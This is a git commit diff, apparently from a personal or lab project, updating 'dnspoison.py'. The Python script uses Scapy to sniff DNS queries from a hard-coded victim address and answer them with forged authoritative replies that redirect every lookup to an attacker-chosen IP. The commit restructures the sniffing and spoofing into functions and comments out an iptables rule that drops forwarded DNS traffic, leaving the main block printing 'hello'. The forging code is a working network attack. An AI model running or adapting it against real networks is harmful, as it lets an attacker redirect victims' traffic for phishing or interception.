7c98a4a0cd76afbc9fb426def4ba1c65912b4e5e
m4ul <hansonlucas06@gmail.com>
2022-11-12 16:11:19 +0100

    dnspoison update

--- dnspoison.py
+++ dnspoison.py
@@ -5,15 +5,18 @@ victimIP = "10.5.1.2"
 gotoIP = "10.5.1.3"
 
 
+def sniffDNS(victimIP):
+	sniff (filter="udp and port 53 and host " + victimIP, prn = spoofDNS)
 
-
-while True:
-    Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
-    packet  = sniff(filter="udp and port 53")
+def spoofDNS(packet):
     if packet[IP].src != "127.0.0.1":
         if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
             spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
-        Popen(["iptables -F"], shell=True, stdout=PIPE)
-        sendp(spoof, count=1)
+            sendp(spoof, count=1)
+
+if __name__ == '__main__':
+    #Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"],shell=True, stdout=PIPE)
+    #sniffDNS()
+    print("hello")
 
     
